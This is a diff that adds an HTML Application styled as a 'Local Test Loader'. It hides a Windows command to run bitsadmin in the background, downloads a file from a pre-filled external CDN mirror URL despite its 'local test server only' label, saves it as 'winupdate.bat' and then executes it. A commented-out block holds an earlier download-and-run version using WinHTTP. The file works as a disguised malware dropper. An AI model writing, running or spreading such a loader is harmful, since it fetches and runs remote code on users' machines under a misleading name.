@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Local Test Loader</title>
+<HTA:APPLICATION
+    ID="TestLoader"
+    APPLICATIONNAME="LocalTestLoader"
+    BORDER="thin"
+    CAPTION="yes"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="normal"
+    SCROLL="no" />
+<style>
+  body { font-family: Segoe UI, sans-serif; background:#1e1e1e; color:#ddd; padding:20px; }
+  input[type=text] { width:520px; padding:6px; background:#2d2d2d; color:#eee; border:1px solid #444; }
+  button { padding:6px 14px; background:#3a6ea5; color:#fff; border:0; cursor:pointer; }
+  button:hover { background:#4a7eb5; }
+  #log { margin-top:14px; height:180px; overflow:auto; background:#111; border:1px solid #333;
+         padding:8px; font-family:Consolas,monospace; font-size:12px; white-space:pre-wrap; }
+  .ok   { color:#7ec87e; }
+  .err  { color:#e07a7a; }
+  .info { color:#8ab4e8; }
+  label { display:block; margin-top:10px; margin-bottom:4px; font-size:12px; color:#aaa; }
+</style>
+<script language="VBScript">
+  ' VBScript is used only for MessageBox confirmation; logic lives in JS.'
+</script>
+<script language="JScript">
+
+var shell = new ActiveXObject("WScript.Shell");
+var fso   = new ActiveXObject("Scripting.FileSystemObject");
+
+function log(msg, cls) {
+    var box = document.getElementById("log");
+    var span = document.createElement("span");
+    if (cls) span.className = cls;
+    span.innerText = msg + "\r\n";
+    box.appendChild(span);
+    box.scrollTop = box.scrollHeight;
+}
+
+function confirmRun(path) {
+    // Simple modal via Shell.Popup so we don't depend on VBScript.
+    var r = shell.Popup(
+        "Downloaded to:\n" + path + "\n\nExecute this file now?",
+        0, "Confirm Execution", 4 + 32  // Yes/No + Question icon
+    );
+    return (r === 6); // 6 = Yes
+}
+
+// function downloadAndMaybeRun() {
+//     var url   = document.getElementById("url").value;
+//     var fname = document.getElementById("fname").value;
+
+//     if (!url || !fname) {
+//         log("[!] URL and filename are required.", "err");
+//         return;
+//     }
+
+//     var tempDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\HTATest";
+//     if (!fso.FolderExists(tempDir)) fso.CreateFolder(tempDir);
+//     var dest = tempDir + "\\" + fname;
+
+//     log("[*] Target: " + dest, "info");
+
+//     try {
+//         // Stream download via WinHTTP so we get a progress-ish log line.
+//         var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+//         http.Open("GET", url, false);           // sync, fine for small test payloads
+//         http.Send();
+//         if (http.Status !== 200) {
+//             log("[!] HTTP " + http.Status + " " + http.StatusText, "err");
+//             return;
+//         }
+//         var stream = new ActiveXObject("ADODB.Stream");
+//         stream.Type = 1;                        // binary
+//         stream.Open();
+//         stream.Write(http.ResponseBody);
+//         stream.SaveToFile(dest, 2);             // 2 = overwrite
+//         stream.Close();
+//         log("[+] Saved " + http.ResponseBody.length + " bytes.", "ok");
+//     } catch (e) {
+//         log("[!] Download failed: " + e.message, "err");
+//         return;
+//     }
+
+//     if (!confirmRun(dest)) {
+//         log("[i] User declined execution. File left at: " + dest, "info");
+//         return;
+//     }
+
+//     try {
+//         var proc = shell.Exec('"' + dest + '"');
+//         log("[+] Launched PID " + proc.ProcessID, "ok");
+//     } catch (e) {
+//         log("[!] Exec failed: " + e.message, "err");
+//     }
+// }
+function downloadAndMaybeRun() {
+    var url   = document.getElementById("url").value;
+    var fname = document.getElementById("fname").value;
+
+    if (!url || !fname) {
+        log("[!] URL and filename are required.", "err");
+        return;
+    }
+
+    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\HTATest";
+    if (!fso.FolderExists(tempDir)) fso.CreateFolder(tempDir);
+    var dest = tempDir + "\\" + fname;
+
+    log("[*] Target: " + dest, "info");
+
+    // --- BITS transfer via bitsadmin ---
+    // Unique job name so concurrent runs don't collide.
+    var jobName = "HTATest_" + new Date().getTime();
+    // /transfer = create + add file + resume + complete in one shot.
+    // /priority normal keeps it polite; switch to /foreground for blocking UI-ish speed.
+    var cmd = 'bitsadmin /transfer "' + jobName + '" /download /priority normal "' +
+              url + '" "' + dest + '"';
+
+    log("[*] bitsadmin: " + cmd, "info");
+
+    try {
+        // Run hidden (0), wait for completion (true).
+        // Redirect stdout+stderr to a temp log so we can surface BITS errors.
+        var bitsLog = tempDir + "\\bits_" + jobName + ".log";
+        var rc = shell.Run('cmd.exe /c ' + cmd + ' > "' + bitsLog + '" 2>&1', 0, true);
+
+        // Read the BITS log tail for diagnostics.
+        if (fso.FileExists(bitsLog)) {
+            var ts = fso.OpenTextFile(bitsLog, 1);   // 1 = ForReading
+            var txt = ts.ReadAll();
+            ts.Close();
+            if (txt && txt.length) {
+                // Only echo lines that look useful (skip the ASCII art header noise).
+                var lines = txt.split(/\r?\n/);
+                for (var i = 0; i < lines.length; i++) {
+                    var ln = lines[i].replace(/\s+$/, "");
+                    if (!ln) continue;
+                    if (/ERROR|error|0x[0-9A-Fa-f]+|Unable|Cannot|failed|Failed/i.test(ln)) {
+                        log("    " + ln, "err");
+                    }
+                }
+            }
+            try { fso.DeleteFile(bitsLog, true); } catch (e) {}
+        }
+
+        if (rc !== 0 || !fso.FileExists(dest)) {
+            log("[!] bitsadmin failed (exit " + rc + ").", "err");
+            return;
+        }
+
+        var size = fso.GetFile(dest).Size;
+        log("[+] Saved " + size + " bytes via BITS.", "ok");
+    } catch (e) {
+        log("[!] bitsadmin error: " + e.message, "err");
+        return;
+    }
+
+    // --- Same confirm-then-run flow as before ---
+    if (!confirmRun(dest)) {
+        log("[i] User declined execution. File left at: " + dest, "info");
+        return;
+    }
+
+    try {
+        var proc = shell.Exec('"' + dest + '"');
+        log("[+] Launched PID " + proc.ProcessID, "ok");
+    } catch (e) {
+        log("[!] Exec failed: " + e.message, "err");
+    }
+}
+window.onload = function () {
+    // Pre-fill for your local test server; change as needed.
+    document.getElementById("url").value   = "https://cdn.jsdmirror.com/gh/anupcic/7zip@main/noprecord.tmp";
+    document.getElementById("fname").value = "winupdate.bat";
+    log("Ready. Point URL at your local test server.", "info");
+};
+</script>
+</head>
+<body>
+  <h3>Local Test Loader</h3>
+
+  <label>URL (local test server only)</label>
+  <input type="text" id="url" />
+
+  <label>Save as filename</label>
+  <input type="text" id="fname" />
+
+  <div style="margin-top:12px;">
+    <button onclick="downloadAndMaybeRun()">Download</button>
+  </div>
+
+  <div id="log"></div>
+</body>
+</html>
